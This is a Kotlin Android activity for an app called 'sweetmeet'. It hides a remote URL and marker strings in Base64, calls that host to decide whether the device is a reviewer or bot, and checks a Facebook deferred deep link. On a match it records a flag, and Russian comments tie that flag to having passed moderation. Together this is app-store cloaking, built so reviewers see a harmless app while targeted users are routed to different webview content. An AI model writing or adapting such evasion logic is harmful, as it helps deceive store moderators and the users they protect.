package bar.gentylove.sweetmeet

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.preference.PreferenceManager
import android.util.Base64
import android.util.Log
import android.webkit.*
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity

import com.facebook.applinks.AppLinkData
import com.onesignal.OneSignal
import okhttp3.*
import okhttp3.Callback
import java.io.IOException
import java.net.UnknownHostException


class FirstMainActivity : AppCompatActivity() {


    private lateinit var okHttpClient: OkHttpClient

    @RequiresApi(Build.VERSION_CODES.JELLY_BEAN_MR1)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_mainactivity)



        if (FirstVxod()) {//второй вход,если прошли моодер
            startActivity(Intent(this, MainBrowserWebview::class.java))

        } else { // первый вход
            initOkHttpClient()
            isBot {
                if (it) {
                    OneSignal.sendTag("nobot", "1")
                    getDeepLink() //джем диплинк

                }
                else{
                    startActivity(Intent(applicationContext, MainBrowserWebview::class.java)) //игра
                    finish()
                    setOkFirstVxod(false)
                }
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.JELLY_BEAN_MR1)  //проберка бот/небот
    fun isBot(result: (bot: Boolean) -> Unit) {
        val urlCheck = String(
            Base64.decode(
                "aHR0cDovL2xvYWRjaGVjay54eXov".toByteArray(),
                Base64.DEFAULT
            )
        )
        val url_nobot = String(
            Base64.decode(
                "bm9ib3Q=".toByteArray(),
                Base64.DEFAULT
            )
        )
        val request_url_nobot = Request.Builder()
            .url("$urlCheck")
            .header("User-Agent", WebSettings.getDefaultUserAgent(applicationContext))
            .build()
        okHttpClient.newCall(request_url_nobot)
            .enqueue(object : Callback {

                override fun onFailure(call: Call, e: IOException) {
                    result(e !is UnknownHostException || !e.message.orEmpty().contains("$url_nobot"))
                }

                override fun onResponse(call: Call, response: Response) {
                    val redirect = response.header("Location")
                    val noBot = redirect?.let { Uri.parse(it).host == "$url_nobot" }
                    result(noBot ?: true)
                }
            })
    }


    private fun getDeepLink() { //шифруем.сравниваем диплинк
        AppLinkData.fetchDeferredAppLinkData(applicationContext, AppLinkData.CompletionHandler {
            if (it != null) {
                val getDepLink = it.targetUri.toString()
                val getDepLink2 = getDepLink.substringBefore("&sub1")
                Log.e("Facebook2", getDepLink2)
                val firstDep = "c3dlZX"
                val secondDep ="RtZWV0"



               var AllDep = "$firstDep$secondDep"
                Log.e("Facook2", AllDep)



                if (getDepLink2 == "myapp://${AllDep}") {

                    Log.e("Facebook", "deep link $getDepLink")
                    setDeepLink(getDepLink.substringAfter("myapp://c3dlZXRtZWV0&"))
                    setOkFirstVxod(true)
                    startActivity(Intent(this, MainBrowserWebview::class.java))
                    finish()
               } else {
                    startActivity(Intent(this, MainBrowserWebview::class.java))
                    finish()
                }


            } else {
                Log.e("Facebook", "deep link NULL")
                startActivity(Intent(this, MainBrowserWebview::class.java))
                finish()
            }
        })
    }


    private fun FirstVxod() =
        PreferenceManager.getDefaultSharedPreferences(applicationContext).getBoolean("ok", false)

    private fun setDeepLink(value: String) {
        val izmenenie = PreferenceManager.getDefaultSharedPreferences(this).edit()
        izmenenie.putString("DEPLFB", "&$value")
        izmenenie.apply()
    }

    fun setOkFirstVxod(value: Boolean) {
        val editor = PreferenceManager.getDefaultSharedPreferences(this).edit()
        editor.putBoolean("ok", value)
        editor.apply()
    }
    @RequiresApi(Build.VERSION_CODES.JELLY_BEAN_MR1)
    private fun initOkHttpClient() {
        okHttpClient = OkHttpClient.Builder()
            .followSslRedirects(false)
            .followRedirects(false)
            .addNetworkInterceptor {
                it.proceed(
                    it.request().newBuilder()
                        .header("User-Agent", WebSettings.getDefaultUserAgent(this))
                        .build()
                )
            }.build()

    }

}


